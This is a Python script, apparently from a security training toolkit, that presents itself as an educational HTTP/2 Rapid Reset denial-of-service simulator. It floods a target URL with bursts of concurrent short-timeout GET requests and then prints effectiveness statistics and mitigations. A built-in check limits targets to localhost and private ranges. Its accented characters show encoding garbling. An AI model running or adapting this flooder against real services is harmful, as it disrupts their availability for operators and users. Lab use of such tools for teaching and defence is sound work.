
#!/usr/bin/env python3
"""
HTTP/2 Rapid Reset DoS Simulator
Desarrollado por @descambiado para BOFA v2.3.0
EDUCATIVO: Simula ataque DoS HTTP/2 Rapid Reset (solo localhost/labs)
"""

import asyncio
import aiohttp
import argparse
import time
import sys
from urllib.parse import urlparse

class HTTP2RapidResetSimulator:
    def __init__(self, target_url, max_streams=100, duration=30, verbose=False):
        self.target_url = target_url
        self.max_streams = max_streams
        self.duration = duration
        self.verbose = verbose
        self.requests_sent = 0
        self.resets_sent = 0
        self.start_time = None
        
    def print_banner(self):
        print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                HTTP/2 Rapid Reset DoS Simulator                 â•‘
â•‘                    HERRAMIENTA EDUCATIVA                         â•‘
â•‘                   Por @descambiado - BOFA                       â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """)
        
    def validate_target(self):
        """Valida que el objetivo sea localhost o un lab autorizado"""
        parsed = urlparse(self.target_url)
        hostname = parsed.hostname.lower()
        
        allowed_hosts = [
            'localhost',
            '127.0.0.1',
            '::1',
            'host.docker.internal'
        ]
        
        # Permitir IPs de red local para labs
        if hostname.startswith(('192.168.', '10.', '172.')):
            allowed_hosts.append(hostname)
            
        if hostname not in allowed_hosts and not hostname.endswith('.local'):
            print(f"âŒ ERROR: Objetivo no autorizado: {hostname}")
            print("Solo se permiten: localhost, 127.0.0.1, IPs locales, dominios .local")
            return False
            
        return True
        
    async def send_rapid_reset_stream(self, session, stream_id):
        """Simula envÃ­o de stream con reset rÃ¡pido"""
        try:
            # Crear request
            start_time = time.time()
            
            # En una implementaciÃ³n real, aquÃ­ se enviarÃ­an frames HTTP/2 especÃ­ficos
            # Para la simulaciÃ³n, usamos requests HTTP/1.1 con timeout muy bajo
            timeout = aiohttp.ClientTimeout(total=0.1)
            
            async with session.get(self.target_url, timeout=timeout) as response:
                # Inmediatamente "reseteamos" la conexiÃ³n cancelando
                pass
                
        except (asyncio.TimeoutError, aiohttp.ClientError):
            # Timeout/error esperado - simula el reset
            self.resets_sent += 1
            
        except Exception as e:
            if self.verbose:
                print(f"[DEBUG] Stream {stream_id} error: {e}")
                
        finally:
            self.requests_sent += 1
            
    async def run_simulation(self):
        """Ejecuta la simulaciÃ³n de rapid reset"""
        print(f"[INFO] Iniciando simulaciÃ³n contra {self.target_url}")
        print(f"[INFO] Streams mÃ¡ximos: {self.max_streams}")
        print(f"[INFO] DuraciÃ³n: {self.duration} segundos")
        print("âš ï¸  NOTA: Esto es una simulaciÃ³n educativa\n")
        
        self.start_time = time.time()
        
        # Configurar sesiÃ³n HTTP/2 simulada
        connector = aiohttp.TCPConnector(limit=self.max_streams)
        timeout = aiohttp.ClientTimeout(total=1.0)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            while time.time() - self.start_time < self.duration:
                # Crear batch de streams concurrentes
                tasks = []
                
                for i in range(min(self.max_streams, 50)):  # Batch de 50
                    task = asyncio.create_task(
                        self.send_rapid_reset_stream(session, i)
                    )
                    tasks.append(task)
                    
                # Ejecutar batch
                await asyncio.gather(*tasks, return_exceptions=True)
                
                # Mostrar progreso
                elapsed = time.time() - self.start_time
                if self.verbose and int(elapsed) % 5 == 0:
                    rate = self.requests_sent / elapsed if elapsed > 0 else 0
                    print(f"[PROGRESS] Tiempo: {elapsed:.1f}s, Requests: {self.requests_sent}, Rate: {rate:.1f}/s")
                    
                # PequeÃ±a pausa para evitar saturar completamente
                await asyncio.sleep(0.1)
                
    def generate_report(self):
        """Genera reporte de la simulaciÃ³n"""
        elapsed_time = time.time() - self.start_time
        
        print("\n" + "="*60)
        print("REPORTE DE SIMULACIÃ“N - HTTP/2 Rapid Reset DoS")
        print("="*60)
        
        print(f"\nğŸ“Š ESTADÃSTICAS:")
        print(f"Objetivo: {self.target_url}")
        print(f"DuraciÃ³n total: {elapsed_time:.2f} segundos")
        print(f"Requests enviados: {self.requests_sent}")
        print(f"Resets simulados: {self.resets_sent}")
        print(f"Rate promedio: {self.requests_sent / elapsed_time:.2f} requests/segundo")
        print(f"Streams mÃ¡ximos: {self.max_streams}")
        
        print(f"\nğŸ¯ EFECTIVIDAD SIMULADA:")
        reset_ratio = (self.resets_sent / self.requests_sent * 100) if self.requests_sent > 0 else 0
        print(f"Ratio de resets: {reset_ratio:.1f}%")
        
        if reset_ratio > 80:
            effectiveness = "ğŸ”´ MUY EFECTIVO"
        elif reset_ratio > 50:
            effectiveness = "ğŸŸ¡ MODERADAMENTE EFECTIVO"
        else:
            effectiveness = "ğŸŸ¢ POCO EFECTIVO"
            
        print(f"Efectividad simulada: {effectiveness}")
        
        print(f"\nğŸ›¡ï¸  MITIGACIONES RECOMENDADAS:")
        print("- Implementar lÃ­mites de rate por cliente")
        print("- Configurar timeouts apropiados en HTTP/2")
        print("- Usar load balancers con protecciÃ³n DDoS")
        print("- Monitorear mÃ©tricas de streams HTTP/2")
        print("- Actualizar servidores web a versiones patcheadas")
        
    async def run(self):
        """Ejecuta la simulaciÃ³n completa"""
        self.print_banner()
        
        print("âš ï¸  AVISO: Esta herramienta es solo para EDUCACIÃ“N y LABS")
        print("Solo usar contra localhost o entornos controlados\n")
        
        if not self.validate_target():
            return False
            
        try:
            await self.run_simulation()
            self.generate_report()
            return True
            
        except Exception as e:
            print(f"[ERROR] Error durante la simulaciÃ³n: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(description="HTTP/2 Rapid Reset DoS Simulator")
    parser.add_argument("target", help="URL objetivo (solo localhost/labs)")
    parser.add_argument("-s", "--streams", type=int, default=100, help="MÃ¡ximo streams concurrentes")
    parser.add_argument("-d", "--duration", type=int, default=30, help="DuraciÃ³n en segundos")
    parser.add_argument("-v", "--verbose", action="store_true", help="Modo verbose")
    
    args = parser.parse_args()
    
    # ValidaciÃ³n bÃ¡sica
    if not args.target.startswith(('http://', 'https://')):
        print("[ERROR] La URL debe incluir el protocolo (http:// o https://)")
        sys.exit(1)
        
    if args.streams > 1000:
        print("[ERROR] MÃ¡ximo de streams limitado a 1000 por seguridad")
        sys.exit(1)
        
    simulator = HTTP2RapidResetSimulator(
        args.target, 
        args.streams, 
        args.duration, 
        args.verbose
    )
    
    try:
        asyncio.run(simulator.run())
    except KeyboardInterrupt:
        print("\n[INFO] SimulaciÃ³n interrumpida por el usuario")
    except Exception as e:
        print(f"[ERROR] Error durante la ejecuciÃ³n: {e}")

if __name__ == "__main__":
    main()
